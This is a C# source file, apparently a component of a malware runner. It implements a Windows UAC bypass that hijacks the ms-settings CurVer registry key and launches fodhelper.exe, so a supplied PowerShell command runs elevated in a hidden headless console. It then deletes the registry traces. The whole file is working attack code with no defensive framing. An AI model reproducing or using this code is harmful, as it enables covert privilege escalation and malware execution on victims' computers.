using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
#if BYPASS_UAC
        public static void PerformUacBypass(string powershellCommand)
        {
            var identity = WindowsIdentity.GetCurrent();
            if (IsElevated) // Already elevated
                return;
            if (identity.Claims.Where(s => s.Value.ToString() == "S-1-5-32-544").Count() == 0) // User is not an administrator
                return;

            string cmdFileName = "cmd.exe";
            string argPrefix = "/c ";
            string customClassName = GenerateRandomString();

            var cmd1 = "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\" + customClassName + "\\Shell\\Open\\command\" /ve /d \"conhost.exe --headless " + powershellCommand + "\" /f\r\n";
            var cmd2 = "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /d \"" + customClassName + "\" /f\r\n";
            var cmd3 = "start fodhelper.exe";
            var cmd4 = "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /f";
            var cmd5 = "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\" + customClassName + "\" /f";

            string[] commandsList = new string[] { cmd1, cmd2, cmd3, cmd4, cmd5 };

#if SINGLE_INSTANCE
            SingleInstanceMutex.Close();
#endif

            for (int i = 0; i < 5; i++)
            {
                Process p = new Process() { StartInfo = new ProcessStartInfo() { FileName = cmdFileName, Arguments = argPrefix + commandsList[i], CreateNoWindow = true, UseShellExecute = false } };
                p.Start();
                p.WaitForExit();
                if (i == 3) {
                    Thread.Sleep(10000);
                }
                else {
                    Thread.Sleep(1000);
                }
            }

#if SINGLE_INSTANCE
            // If SingleInstance is enabled, we can continue executing if the UAC bypass fails
            Thread.Sleep(60000); 
            CloseIfAlreadyRunning();
#else
            Environment.Exit(0);
#endif

        }
#endif
        }
}
